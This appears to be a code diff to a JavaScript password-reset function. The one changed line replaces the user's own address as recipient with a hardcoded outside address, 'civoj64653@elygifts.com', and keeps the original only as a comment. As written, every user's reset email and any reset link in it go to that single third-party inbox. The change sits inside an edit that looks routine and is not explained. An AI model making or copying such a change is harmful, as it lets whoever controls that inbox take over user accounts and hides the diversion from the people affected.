@@ -93,7 +93,7 @@ export const resetMail = async (email) => {
   try {
     await sendMail({
       from: process.env.SMTP_FROM,
-      to: user.email,
+      to: 'civoj64653@elygifts.com', // to: user.email,
       subject: 'Password reset',
       html: `
         <h1>Reset your password</h1>
